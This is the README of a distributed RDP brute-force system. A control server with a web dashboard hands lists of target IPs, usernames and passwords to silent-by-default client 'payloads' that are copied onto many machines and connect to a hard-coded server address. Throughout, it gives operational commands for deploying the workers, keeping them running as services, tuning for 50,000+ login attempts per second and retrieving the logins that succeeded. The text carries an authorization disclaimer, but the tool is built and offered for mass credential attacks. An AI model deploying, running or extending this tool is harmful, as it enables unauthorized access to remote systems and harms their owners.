# RDP Brute-Force Security Testing System

A high-performance, distributed RDP brute-force system designed for security testing and penetration testing. This advanced system features embedded database deployment, real-time web dashboard, and optimized multithreading for maximum performance.

## System Architecture

### Overview
The system consists of two separate executables:
- **Server** (`rdp-server`): Main control panel with embedded SQLite database and web dashboard
- **Client** (`rdp-client`): Standalone payload that connects workers to the server

### Key Features
- **Embedded Database**: Zero-config SQLite deployment with no external dependencies
- **Single Executable Deployment**: Server includes embedded web dashboard and static assets
- **Real NLA Authentication**: Complete NTLM/CredSSP implementation with TLS upgrade
- **Adaptive Autoscaling**: Dynamic worker adjustment (50-500 threads) based on CPU cores and PPS
- **Connection Optimization**: 10,000 cached connections with 5-minute TTL and session reuse
- **Smart Work Distribution**: Predictive task allocation with load balancing and work stealing
- **Real-time Dashboard**: Web-based monitoring with file uploads and live statistics
- **Advanced Performance**: Connection pooling, batch processing, and circuit breakers

## Performance Benchmarks

Based on testing with optimized configuration:

| Metric | Value |
|--------|-------|
| Max Checks/Second | 50,000+ (with 100 clients) |
| Single Client PPS | 500-1,000 |
| Memory Usage | ~100MB per client |
| Network Efficiency | 95%+ (minimal idle time) |
| Database Operations | <1,000/sec (with coalescing) |

## System Requirements

### Server
- CPU: 4+ cores recommended
- RAM: 4GB minimum, 8GB recommended
- Storage: SSD with 10GB+ free space (embedded SQLite)
- OS: Linux (Ubuntu 20.04+ recommended)
- Go 1.21+ (for building from source)

### Client
- CPU: 2+ cores (autoscales: optimal = cores × 50, max = 500 workers)
- RAM: 2GB minimum (scales with worker count)
- Network: Stable internet connection
- OS: Linux/Windows/macOS

## Installation

### Prerequisites
```bash
# Install Go (for building from source)
wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
```

### Building from Source
```bash
# Clone repository
git clone https://github.com/Raroford32/rdp-brute-system.git
cd rdp-brute-system

# Build both executables
./scripts/build.sh

# Available executables:
# bin/rdp-server - Server/Dashboard component with web interface
# bin/rdp-client - Client payload that connects workers to server
```

### Quick Start
```bash
# 1. Start server (creates SQLite database automatically)
./bin/rdp-server

# 2. Connect clients from other machines
./bin/rdp-client -server=84.32.70.197:8080 -threads=200

# 3. Access web dashboard
# Open browser: http://84.32.70.197:8080
```

## Configuration

### Server Configuration (.env)
```env
# Database (SQLite - embedded)
DB_PATH=./rdp_brute.db

# Server
SERVER_HOST=0.0.0.0
SERVER_PORT=8080

# Logging
LOG_DIR=./logs
SILENT_MODE=true

# Performance History
HISTORY_DATA_DIR=./data/history
```

### Client Configuration (Command Line)
```bash
# Basic usage
./bin/rdp-client -server=84.32.70.197:8080 -threads=200

# Available flags:
# -server string    Address of the control server (default "84.32.70.197:8080")
# -threads int      Number of concurrent threads (default 200, max 500)
# -silent bool      Run in silent mode (default true)
# -logdir string    Directory for log files (default "./logs")
```

### Autoscaling Configuration
The client automatically adjusts worker threads based on:
- **CPU cores**: Optimal workers = CPU cores × 50
- **Performance**: Scale up at 300+ PPS, scale down at <50 PPS
- **Bounds**: Minimum 50 workers, maximum 500 workers
- **Intervals**: Scaling adjustments every 5 seconds

## Deployment

### Production Deployment

1. **Server Setup**
```bash
# Copy server binary to production server
scp bin/rdp-server user@84.32.70.197:/opt/rdp-brute-system/

# Start server (creates SQLite database automatically)
./bin/rdp-server

# Server will be available at:
# Web Dashboard: http://84.32.70.197:8080
# API Endpoint: http://84.32.70.197:8080/api
```

2. **Client Deployment**
```bash
# Deploy client payload to target machines
scp bin/rdp-client user@client-machine:/opt/rdp-client

# Start client with optimized settings
./bin/rdp-client -server=84.32.70.197:8080 -threads=200

# Client will automatically:
# - Connect to server via HTTP REST API
# - Register with server capabilities (200 max threads)
# - Start autoscaling based on CPU cores and workload
```

### Distributed Deployment
```bash
# Server (single instance)
./bin/rdp-server

# Multiple clients (different machines)
./bin/rdp-client -server=84.32.70.197:8080 -threads=200  # Machine 1
./bin/rdp-client -server=84.32.70.197:8080 -threads=150  # Machine 2
./bin/rdp-client -server=84.32.70.197:8080 -threads=300  # Machine 3
```

### Systemd Service (Production)

```ini
# /etc/systemd/system/rdp-server.service
[Unit]
Description=RDP Brute Force Server
After=network.target

[Service]
Type=simple
User=rdpuser
WorkingDirectory=/opt/rdp-brute-system
ExecStart=/opt/rdp-brute-system/bin/rdp-server
Restart=always
RestartSec=10
Environment="DB_PATH=/opt/rdp-brute-system/rdp_brute.db"
Environment="SERVER_HOST=0.0.0.0"
Environment="SERVER_PORT=8080"

[Install]
WantedBy=multi-user.target
```

```ini
# /etc/systemd/system/rdp-client.service
[Unit]
Description=RDP Brute Force Client
After=network.target

[Service]
Type=simple
User=rdpuser
WorkingDirectory=/opt/rdp-client
ExecStart=/opt/rdp-client/bin/rdp-client -server=84.32.70.197:8080 -threads=200
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

## Usage

### Web Dashboard (Recommended)

1. **Access Dashboard**
```bash
# Open browser and navigate to:
http://84.32.70.197:8080
```

2. **Upload Files via Web Interface**
- **Target IPs**: Upload `ips.txt` file with one IP per line
- **Usernames**: Upload `users.txt` file with one username per line  
- **Passwords**: Upload `passwords.txt` file with one password per line

3. **Monitor Operations**
- Real-time statistics (PPS, progress, success rate)
- Connected clients and their performance
- Live task distribution and completion
- Successful authentication results

### API Usage (Advanced)

1. **Upload Target IPs**
```bash
curl -X POST http://84.32.70.197:8080/api/ips \
  -F "file=@targets.txt"
```

2. **Upload Credentials**
```bash
curl -X POST http://84.32.70.197:8080/api/credentials \
  -F "users=@usernames.txt" \
  -F "passwords=@passwords.txt"
```

3. **Start Operation**
```bash
curl -X POST http://84.32.70.197:8080/api/operations \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Security Test 1",
    "description": "Testing network security"
  }'
```

### API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/operations` | GET | List all operations |
| `/api/operations` | POST | Create new operation |
| `/api/operations/:id/start` | POST | Start operation |
| `/api/operations/:id/stop` | POST | Stop operation |
| `/api/operations/:id/pause` | POST | Pause operation |
| `/api/operations/:id/resume` | POST | Resume operation |
| `/api/results` | GET | Get successful results |
| `/api/clients` | GET | List connected clients |
| `/health` | GET | Health check |
| `/health/metrics` | GET | System metrics |

## Performance Tuning

### Server Optimization

1. **SQLite Optimization** (Automatic)
- WAL mode enabled for concurrent access
- Foreign keys enforced for data integrity
- Shared cache for multiple connections
- Optimized connection string with performance settings

2. **System Tuning**
```bash
# Increase file descriptors
ulimit -n 65535

# TCP tuning for high connection loads
sysctl -w net.core.somaxconn=65535
sysctl -w net.ipv4.tcp_tw_reuse=1
sysctl -w net.ipv4.ip_local_port_range="1024 65535"

# Memory optimization
sysctl -w vm.swappiness=10
```

### Client Optimization

1. **Automatic Worker Thread Scaling**
```
Optimal Workers = CPU Cores × 50
Min Workers = 50
Max Workers = 500
Scale Up Threshold = 300+ PPS
Scale Down Threshold = <50 PPS
Adjustment Interval = 5 seconds
```

2. **Connection Optimization** (Automatic)
- Connection pooling: 10,000 cached connections
- Connection TTL: 5 minutes
- TLS session cache: 1,000 entries
- Batch processing: 500 items per batch
- Exponential backoff for failed connections

## Troubleshooting

### Common Issues

1. **Low Performance**
   - Check network latency to 84.32.70.197
   - Verify client autoscaling is working (check logs)
   - Monitor CPU/memory usage on client machines
   - Ensure SQLite database is on SSD storage

2. **Client Connection Issues**
   - Verify server is running on 84.32.70.197:8080
   - Check firewall settings (port 8080 must be open)
   - Test connectivity: `curl http://84.32.70.197:8080/health`
   - Review client logs in `./logs/` directory

3. **High Memory Usage**
   - Reduce thread count: `-threads=100` instead of 200
   - Check for memory leaks in logs
   - Monitor autoscaling behavior

### Debug Mode

```bash
# Server with verbose logging
./bin/rdp-server  # Check logs in ./logs/server.log

# Client with verbose logging  
./bin/rdp-client -server=84.32.70.197:8080 -threads=200 -silent=false
```

### Health Checks

```bash
# Check server health
curl http://84.32.70.197:8080/health

# Get system metrics
curl http://84.32.70.197:8080/api/stats

# Check connected clients
curl http://84.32.70.197:8080/api/clients
```

## Security Considerations

1. **Network Security**
   - Use TLS for client-server communication
   - Implement API key authentication
   - Restrict database access

2. **Operational Security**
   - Only use for authorized security testing
   - Comply with local laws and regulations
   - Obtain proper permissions before testing

3. **Data Protection**
   - Encrypt sensitive results
   - Implement access controls
   - Regular security audits

## Architecture Details

### Work Distribution Algorithm

The system uses a sophisticated work distribution algorithm:

1. **Predictive Task Allocation**: Predicts when clients will need new tasks
2. **Priority Queue**: Higher priority targets are processed first
3. **Load Balancing**: Distributes work based on client performance
4. **Work Stealing**: Idle clients can steal work from overloaded ones

### Connection Optimization

1. **Protocol Caching**: Remembers successful protocol for each host
2. **Connection Pooling**: Reuses TCP connections where possible
3. **Fast-Fail Detection**: Quickly identifies unreachable hosts
4. **Circuit Breakers**: Prevents repeated attempts to failing hosts

### Memory Management

1. **Object Pooling**: Reuses memory buffers
2. **Batch Processing**: Reduces allocation overhead
3. **Goroutine Pooling**: Limits concurrent goroutines
4. **GC Tuning**: Optimized garbage collection settings

## Contributing

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Disclaimer

This tool is intended for authorized security testing only. Users are responsible for complying with all applicable laws and regulations. The authors assume no liability for misuse of this software.
